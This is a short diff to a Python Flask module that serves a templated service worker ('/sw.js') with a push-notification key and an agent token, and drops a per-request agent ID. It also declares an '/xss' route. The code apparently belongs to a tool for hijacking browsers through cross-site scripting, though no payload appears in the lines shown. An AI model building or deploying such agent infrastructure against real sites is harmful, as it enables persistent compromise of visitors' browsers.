@@ -1,5 +1,4 @@
 import os
-import uuid
 from flask import render_template, request, Blueprint
 from config import Config
 
@@ -14,7 +13,7 @@ def apply_cors(response):
 @modules.route('/sw.js')
 def sw():
     vapidPub = os.popen("vapid --applicationServerKey | cut -d' ' -f5").read().strip()
-    return render_template('sw.js', host = request.host, vapidPub = vapidPub, agent_token = Config.AGENT_TOKEN, agentID = str(uuid.uuid4())), \
+    return render_template('sw.js', host = request.host, vapidPub = vapidPub, agent_token = Config.AGENT_TOKEN), \
                           {'Content-Type': 'application/javascript'}
 
 @modules.route('/xss')
